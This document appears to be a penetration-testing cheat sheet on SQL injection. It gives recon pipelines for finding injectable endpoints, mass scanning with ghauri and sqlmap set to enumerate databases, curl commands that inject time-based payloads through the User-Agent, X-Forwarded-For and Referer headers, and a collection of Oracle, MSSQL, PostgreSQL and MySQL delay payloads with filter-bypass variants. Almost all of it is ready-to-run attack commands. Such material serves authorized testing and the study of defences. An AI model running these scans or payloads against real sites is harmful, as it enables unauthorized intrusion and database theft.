
# SQL Injection Methodology

## Endpoint Discovery

**Single domain reconnaissance for potential SQL injectable endpoints**

```bash
subfinder -d target.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
```

**Multiple subdomain reconnaissance for SQL injection testing**

```bash
subfinder -d -l subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
```

**Discover potential SQL injectable parameters using gau**

```bash
echo https://target.com | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='
```

**Alternative method for finding SQL injectable endpoints using katana**

```bash
echo https://target.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp'
```

**Mass SQL injection testing using ghauri**

```bash
subfinder -d target.com -all -silent | gau --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm
```

**Comprehensive SQL injection testing using sqlmap**

```bash
subfinder -d target.com -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent
```

## Header-Based Injection

**Testing for time-based SQL injection via User-Agent header**

```bash
curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://target.com'
```

**Testing for time-based SQL injection via X-Forwarded-For header**

```bash
curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://target.com'
```

**Testing for time-based SQL injection via Referer header**

```bash
curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://target.com'
```

**Alternative User-Agent based SQL injection test**

```bash
curl -v -A 'Mozilla/5.0', (select*from(select(sleep(20)))a) # 'http://target.com'
```

**User-Agent header-based MySQL time-based injection**

```bash
curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://target.com'
```

**X-Forwarded-For header-based MySQL time-based injection**

```bash
curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://target.com'
```

**Referer header-based MySQL time-based injection**

```bash
curl -H 'Referer: https://target.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://target.com'
```

## Database-Specific Payloads

**Oracle database time-based injection payload**

```bash
SELECT dbms_pipe.receive_message(('a'),10) FROM dual
```

**Microsoft SQL Server time-based injection payload**

```bash
WAITFOR DELAY '0:0:10'
```

**PostgreSQL time-based injection payload**

```bash
SELECT pg_sleep(10)
```

**MySQL time-based injection payload**

```bash
SELECT sleep(10)
```

## Advanced Payloads

**MySQL alternative time-based payload with URL encoding**

```bash
0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z
```

**PostgreSQL complex time-based injection payload**

```bash
'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1
```

**MySQL multi-condition time-based payload with comment bypass**

```bash
if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0))OR'*/
```

**Combined MySQL and MSSQL time-based payload**

```bash
1234 AND SLEEP(10)';WAITFOR DELAY '00:00:05';--
```

**Parameter-based MySQL time injection test**

```bash
paramname=1'-IF(1=1,SLEEP(10),0) AND paramname='1
```
